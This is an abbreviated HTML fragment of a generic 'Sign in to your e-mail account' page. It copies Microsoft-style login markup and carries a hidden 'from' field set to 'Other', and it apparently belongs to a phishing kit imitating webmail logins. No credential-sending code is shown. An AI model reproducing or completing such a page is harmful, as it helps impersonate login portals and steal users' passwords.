...
<head>
    ...
    <title>Sign in to your e-mail account</title>
    ...
    <link rel="shortcut icon" href="assets/files/faviconother.png">
...
<div>
    ...
    <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
        <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
            ...
            <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background: url(assets/files/bgother.jpg) no-repeat center center fixed;  -webkit-background-size: cover;
                                ...
                                <div class="row">
                                    ...
                                    <div class="form-group col-md-24">
                                        ...
                                        <div class="placeholderContainer" >
                                            ...
                                            <input type="hidden" name="from" value="Other">
